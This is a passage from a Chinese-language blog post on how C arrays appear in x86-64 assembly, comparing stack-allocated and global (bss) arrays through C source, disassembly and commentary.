<pre><code>0x404060:man[0]-----
                    |
                    |        
                    ----&gt;  -----------
                          |              |
                          |      *name      |----------
                          |              |            |
                           -----------            |
                          |              |            |    
                          |       age      |            |
                          |              |            |
                            -----------            |
                          |              |            |
                          |      height  |            |
                          |              |            |
                            -----------            |
                          |              |            |
                          |      x[10]      |            |
                          |              |            |
                           -----------            |
                                                   |
                                                   ------&gt;  --------
                                                           |         |
                                                           |  name  |
                                                           |        |
                                                            --------</code></pre><h2 id="demo3"><a href="#demo3" class="headerlink" title="demo3"></a>demo3</h2><p>这个demo主要是分析数组实现</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class=" language-assembly"><code class="language-assembly">  401156:    55                       push   rbp
  401157:    48 89 e5                 mov    rbp,rsp
  40115a:    48 83 ec 40              sub    rsp,0x40
  40115e:    64 48 8b 04 25 28 00     mov    rax,QWORD PTR fs:0x28
  401165:    00 00 
  401167:    48 89 45 f8              mov    QWORD PTR [rbp-0x8],rax
  40116b:    31 c0                    xor    eax,eax
  40116d:    c7 45 cc 00 00 00 00     mov    DWORD PTR [rbp-0x34],0x0
  401174:    eb 10                    jmp    401186 <main+0x30>
  401176:    8b 45 cc                 mov    eax,DWORD PTR [rbp-0x34]
  401179:    48 98                    cdqe   
  40117b:    8b 55 cc                 mov    edx,DWORD PTR [rbp-0x34]
  40117e:    89 54 85 d0              mov    DWORD PTR [rbp+rax*4-0x30],edx
  401182:    83 45 cc 01              add    DWORD PTR [rbp-0x34],0x1
  401186:    83 7d cc 09              cmp    DWORD PTR [rbp-0x34],0x9
  40118a:    7e ea                    jle    401176 <main+0x20>
  40118c:    b8 00 00 00 00           mov    eax,0x0
  401191:    48 8b 4d f8              mov    rcx,QWORD PTR [rbp-0x8]
  401195:    64 48 33 0c 25 28 00     xor    rcx,QWORD PTR fs:0x28
  40119c:    00 00 
  40119e:    74 05                    je     4011a5 <main+0x4f>
  4011a0:    e8 8b fe ff ff           call   401030 <__stack_chk_fail@plt>
  4011a5:    c9                       leave  
  4011a6:    c3                       ret    
</code></pre>
<p>其实分析过上面的结构体的数组，这个就很清楚了，</p>
<pre class=" language-assembly"><code class="language-assembly">40116d:    c7 45 cc 00 00 00 00     mov    DWORD PTR [rbp-0x34],0x0
401174:    eb 10                    jmp    401186 <main+0x30></code></pre>
<p>这一句定义变量i，然后跳转</p>
<pre class=" language-assembly"><code class="language-assembly">401186:    83 7d cc 09              cmp    DWORD PTR [rbp-0x34],0x9
40118a:    7e ea                    jle    401176 <main+0x20></code></pre>
<p>两段加起来就是for循环了</p>
<pre class=" language-assembly"><code class="language-assembly">401176:    8b 45 cc                 mov    eax,DWORD PTR [rbp-0x34]
401179:    48 98                    cdqe   
40117b:    8b 55 cc                 mov    edx,DWORD PTR [rbp-0x34]
40117e:    89 54 85 d0              mov    DWORD PTR [rbp+rax*4-0x30],edx
401182:    83 45 cc 01              add    DWORD PTR [rbp-0x34],0x1</code></pre>
<p>这里就能看出，a[10]是从$rbp-0x30开始存储的，一个值占用四个字节，所以根据这两个demo，我们可以知道，数组连续占用一块内存，和其他局部变量一样都是通过$rbp寻址，再看最后一个demo，bss段的数组</p>
<h2 id="demo3-1"><a href="#demo3-1" class="headerlink" title="demo3"></a>demo3</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class=" language-assembly"><code class="language-assembly">  401146:    55                       push   rbp
  401147:    48 89 e5                 mov    rbp,rsp
  40114a:    c7 45 fc 00 00 00 00     mov    DWORD PTR [rbp-0x4],0x0
  401151:    eb 13                    jmp    401166 <main+0x20>
  401153:    8b 45 fc                 mov    eax,DWORD PTR [rbp-0x4]
  401156:    48 98                    cdqe   
  401158:    8b 55 fc                 mov    edx,DWORD PTR [rbp-0x4]
  40115b:    89 14 85 60 40 40 00     mov    DWORD PTR [rax*4+0x404060],edx
  401162:    83 45 fc 01              add    DWORD PTR [rbp-0x4],0x1
  401166:    83 7d fc 09              cmp    DWORD PTR [rbp-0x4],0x9
  40116a:    7e e7                    jle    401153 <main+0xd>
  40116c:    b8 00 00 00 00           mov    eax,0x0
  401171:    5d                       pop    rbp
  401172:    c3                       ret    
</code></pre>
<p>这个demo中数组是未初始化的全局变量，汇编代码中和上一个的差别在于寻址</p>
<pre class=" language-assembly"><code class="language-assembly">40115b:    89 14 85 60 40 40 00     mov    DWORD PTR [rax*4+0x404060],edx</code></pre>
<p>局部变量数组通过$rbp寻址，而全局变量数组直接通过数组在bss段中的地址来寻址</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></div></div><a class="button-hover more" href="/LawlietLW.github.io/2020/02/10/c-yu-yan-zai-hui-bian-zhong-de-biao-xian-xing-shi/#more">阅读全文</a></div></div><div id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/LawlietLW.github.io/page/2/">2</a><a class="page-number" href="/LawlietLW.github.io/page/3/">3</a><a class="extend next" rel="next" href="/LawlietLW.github.io/page/2/">&lt;i class&#x3D;&quot;fas fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></div></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fas fa-user"></i></span><span id="busuanzi_value_site_uv"></span><span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fas fa-eye"></i></span><span id="busuanzi_value_site_pv"></span><span></span></div><div class="copyright">&copy;2019 ～ 2020 By Lock</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/LawlietLW.github.io/js/highlight.js"></script><!--script(src=url)--></body></html>